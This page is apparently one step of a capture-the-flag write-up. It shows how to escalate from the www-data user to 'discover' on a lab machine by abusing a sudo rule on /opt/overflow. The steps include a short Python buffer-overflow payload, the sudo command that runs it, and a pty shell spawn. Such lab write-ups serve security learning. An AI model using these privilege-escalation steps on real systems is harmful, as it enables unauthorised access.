<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.2 Get an user (First flag)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>4.2 Get an user (First flag)</h1><br/><p></p><p>1. Look at the ‘sudo’ permissions of “www.data” user.</p><p>    <div class="codebox"><pre>www-data@devian<span style="color:#a52a2a;font-weight:700">:/</span>$ <span style="color:#a52a2a;font-weight:700">sudo</span> -l<br /></pre></div></p><p></p><p>	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1013-1.png" alt="images/1013-1.png" /></p><p></p><p>    The command “/opt/overflow” can run command (or edit file) as specified user “discover” without any password.</p><p>    </p><p>2. Go to the “/opt&quot; directory and list it.</p><p>    <div class="codebox"><pre>www-data@debian<span style="color:#a52a2a;font-weight:700">:/</span>$ <span style="color:#a52a2a;font-weight:700">cd</span> <span style="color:#a52a2a;font-weight:700">/</span>opt<br />www-data@debian<span style="color:#a52a2a;font-weight:700">:/</span>opt$ <span style="color:#a52a2a;font-weight:700">ls</span> -al</pre></div></p><p>	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1013-2.png" alt="images/1013-2.png" /></p><p>    </p><p>    There&#39;s a file called “hint”.</p><p></p><p>3. Show the &quot;hint&#39; file content.</p><p>    <div class="codebox"><pre>www-data@debian<span style="color:#a52a2a;font-weight:700">:/</span>opt$ <span style="color:#a52a2a;font-weight:700">cat</span> hint</pre></div>    </p><p>	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1013-3.png" alt="images/1013-3.png" /></p><p></p><p>4. Visit <a href="https://github.com/naivenom/exploiting/blob/master/angstromctf2016/buffer_overflow2.py">https://github.com/naivenom/exploiting/blob/master/angstromctf2016/buffer_overflow2.py</a> and make a copy of that file on your victim&#39;s machine “/tmp” directory .</p><p>    <div class="codebox"><pre><span style="color:#a020f0;font-weight:400">import</span> sys<br />sys.stdout.write(<span style="color:#ff00ff;font-weight:400">&quot;AAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>+<span style="color:#ff00ff;font-weight:400">&quot;\x5d\x06\x40\x00&quot;</span>)</pre></div></p><p>    If you have dificult to create it directly on the victime&#39;s machine, open a Python HTTP server on your Kali Machine and get from there with the command “wget” on your victim&#39;s machine.</p><p></p><p>5. Run “overflow”.</p><p>    <div class="codebox"><pre>www-data@debian<span style="color:#a52a2a;font-weight:700">:/</span>tmp$ <span style="color:#a52a2a;font-weight:700">sudo</span> -u discover <span style="color:#a52a2a;font-weight:700">/</span>opt<span style="color:#a52a2a;font-weight:700">/</span>overflow $<span style="color:#a52a2a;font-weight:700">(</span>python3 exploit.py<span style="color:#a52a2a;font-weight:700">)</span><br /></pre></div></p><p></p><p>	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1013-4.png" alt="images/1013-4.png" /></p><p>    </p><p>6. Stabilize the shell.</p><p>    <div class="codebox"><pre>$ python3 -c <span style="color:#ff00ff;font-weight:400">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span></pre></div>    </p><p>    <span style="color:#ffa500;">Output:</span>    </p><p>    <img src="images/1013-5.png" alt="images/1013-5.png" /></p><p>    You&#39;re “discover” user.</p><p></p><p>7. Get the flag.</p><p>    <div class="codebox"><pre>discover@debian<span style="color:#a52a2a;font-weight:700">:/</span>tmp$ <span style="color:#a52a2a;font-weight:700">cd</span> <span style="color:#a52a2a;font-weight:700">/</span>home<span style="color:#a52a2a;font-weight:700">/</span>discover<br />discover@debian<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">ls</span> -l<br />discover@debian<span style="color:#a52a2a;font-weight:700">:</span>~$ <span style="color:#a52a2a;font-weight:700">cat</span> User.txt<br /><br /></pre></div> </p><p>	<span style="color:#ffa500;">Output:</span></p><p>    <img src="images/1013-6.png" alt="images/1013-6.png" /></p><p>    </p><p>    <img src="images/1013-7.png" alt="images/1013-7.png" /></p><p></p><p></p><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div>
</body>
</html>
